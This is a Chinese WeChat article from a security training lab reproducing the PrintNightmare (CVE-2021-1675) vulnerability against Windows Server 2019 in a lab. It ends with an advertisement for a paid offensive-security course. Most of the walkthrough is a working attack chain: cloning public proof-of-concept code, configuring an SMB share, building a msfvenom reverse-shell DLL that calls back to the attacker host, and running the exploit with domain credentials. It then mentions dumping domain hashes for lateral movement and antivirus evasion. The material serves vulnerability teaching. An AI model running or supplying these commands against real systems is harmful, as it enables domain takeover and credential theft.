##  微软通杀漏洞-CVE-2021-1675复现

原创 徐哥 [ Ms08067安全实验室 ](javascript:void\(0\);)

**Ms08067安全实验室** ![]()

微信号 Ms08067_com

功能介绍 “Ms08067安全实验室”致力于网络安全的普及和培训！

____

__

收录于话题

#漏洞复现 23

#Web安全进阶实战班 5

#渗透小技巧 8

********文章来源｜MS08067安全实验室********  

> 本文作者： **** **** **龙诺** （Web知识星球追洞小组）  
>

#  

# 一  准备环境

实验环境：windows2019 （192.168.189.145）

kali linux （192.168.189.146）

需要：一个普通的域账户

需要：开启 print spooler服务

    
    
    使用反弹shell ：需要关闭windows2019的安全中心 或者用免杀  
    

需要：windows2019安装smb1协议（没有这个会报错）

## 二 搭建环境

### 安装impacket

我这里使用的是python虚拟环境安装搭建这样的好处是不破坏系统环境，因为python有时候安装各种模块多了容易冲突所一我们使用虚拟环境。

#### 构造虚拟环境

virtualenv -p python3 文件夹

如果没有virtualenv的话需要你pip安装模块

构造完成以后我们使用

source 文件夹/bin/activate

进入后我们去github下载poc安装`  
`

`git clone https://github.com/cube0x0/CVE-2021-1675.git git clone
https://github.com/cube0x0/impacket`

首先要下载poc impacket模块然后安装

![](https://gitee.com/fuli009/images/raw/master/public/20210819130352.png)

因为我们使用的是虚拟环境所以我们可以直接安装安装完以后切换到poc处就可以了

source 文件夹/bin/activate python setup.py install python CVE-2021-1675.py -h  

#### 配置smb服务器

`[global] workgroup = workgroup server string = test netbios name = MZ
security = user map to guest = Bad User smb ports = 445 log file =
/var/log/samba/log.%m max log size = 5 min protocol = SMB2`

`[smb] comment = Samba browseable = yes writeable = yes public = yes path =
/tmp/ read only = no guest ok = yes`

#### 按照这个配置以后就可以使用impacket-smbserver 文件名、目录、开启服务器，如图

![](https://gitee.com/fuli009/images/raw/master/public/20210819130403.png)

#### 生成dll和启动msf

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.189.146
LPORT=4444 -f dll -o /tmp/rever.dll msfconsole use exploit/multi/handler set
payload windows/x64/meterpreter/reverse_tcp exploit`  

![](https://gitee.com/fuli009/images/raw/master/public/20210819130404.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210819130405.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210819130406.png)

#### 利用漏洞

`python CVE-2021-1675.py demonba.xxx/yuce:Hello7p@192.168.189.145
'\\192.168.189.146\smb\rever.dll'`  

![](https://gitee.com/fuli009/images/raw/master/public/20210819130407.png)

如果出错则需要安装smb1在windows2019上出错代码，下图

![]()

可以现在2019连接smb服务器出现这种报错

![](https://gitee.com/fuli009/images/raw/master/public/20210819130408.png)

成功，下图

![](https://gitee.com/fuli009/images/raw/master/public/20210819130410.png)

impacket-smbserver服务器也会有数据交互

![](https://gitee.com/fuli009/images/raw/master/public/20210819130411.png)

同时会有反弹shell

![](https://gitee.com/fuli009/images/raw/master/public/20210819130412.png)

我们可以直接查看域中账户hash 进行横向渗透

![]()

##### dll文件在windows

上传成功，如果开着windows安全中心会出现图

![](https://gitee.com/fuli009/images/raw/master/public/20210819130414.png)

上传不成功  

![](https://gitee.com/fuli009/images/raw/master/public/20210819130415.png)

这里就要考虑免杀了,切记只能是普通账户

![]()

### 漏洞扫描

`https://github.com/cybersecurityworks553/CVE-2021-1675_PrintNightMare`

### ![](https://gitee.com/fuli009/images/raw/master/public/20210819130416.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210819130417.png)  

# 总结

需要了解smb配置

windows2019域配置

在kali无法连接2019的时候逆向思考看看2019可以连接smb共享文件码？

https://github.com/cube0x0/CVE-2021-1675/issues/36 这里也有人问这个问题我不知道他解决了吗？

![](https://gitee.com/fuli009/images/raw/master/public/20210819130418.png)

我是受下面一句话很长时间突然开悟了2019可以链接吗？

![](https://gitee.com/fuli009/images/raw/master/public/20210819130419.png)复现看着简单但是各种环境问题还有小白配置问题只有复现了才知道！

  

 **追洞小组负责人Taoing主讲  
**

 **WEB高级攻防实战班 第1期   来袭**

 ** **  
****

 ** **课程围绕：外围打点、边界突破、PHP审计、SRC漏洞挖掘、应急响应****

  

 **课程大纲（最新）**

  

![](https://gitee.com/fuli009/images/raw/master/public/20210819130420.png)
*大纲仅作为参考，会根据当期进度有所变化（加客服获取高清课程导图）  

  

 **课程目录 **（最新）****

![](https://gitee.com/fuli009/images/raw/master/public/20210819130421.png)

  

  

 **课程费用**

每期班定价 **2999** ， **第一期班** **首发价：** **2499** （ **前50名送365元Web安全知识星球名额** ），
**每个报名学员都可享受一次免费的重听权益** ，一次没学懂就再来一遍，后续培训可任选一期来听。请有意参加培训的学员抓紧报名！  
  
 **支持支付宝、信用卡、花呗分期，对公转账，可开发票！**  
  

 **学习资源**

前50名报名同学，送365元Web知识星球名额，可提前先行学习Web安全相关知识，并提供课程中需要的相关软件和环境。  
  

 **上课时间**

 **每周一、二、三、四的晚上 19：00-21:00 ，共24天，48课时，为期6周**
。如果无法准时参加直播课程，在线培训的每节课程都会被录制成视频上传到学员区，可随时下载观看。  

 **  
**

 **上课方式**

培训采用在线直播+随堂录播+微信群解答的形式，无需等待，报名后立即进入“Web星球”开始预习。

 **  
**

 **讲师介绍**

 **Taoing**
：MS08067安全实验室核心成员，Web安全知识星球合伙人，安恒信息安全高级工程师，擅长企业安全研究、情报分析、渗透测试，安全开发。  
  
 **TtssGkf** ：MS08067安全实验室核心成员，Web安全知识星球合伙人，Defcon Group
86021议题分享者，致力于漏洞分析、代码审计、漏洞挖掘。  
  

  

 **    你距离大佬，只差一个决定       **

详情咨询请联系小客服  

![]()

  

  

 **扫描下方二维码加入星球学习**  

 **加入后邀请你进入内部微信群，内部微信群永久有效！**

![](https://gitee.com/fuli009/images/raw/master/public/20210819130423.png)
![](https://gitee.com/fuli009/images/raw/master/public/20210819130424.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210819130425.png)![](https://gitee.com/fuli009/images/raw/master/public/20210819130426.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210819130427.png)
![]()  

 **来和5000+位同学一起加入星球学习吧！**  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210819130428.png)  

  

![]()

徐哥

如有帮助，请随意打赏。

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

如有帮助，请随意打赏。

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

微软通杀漏洞-CVE-2021-1675复现

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

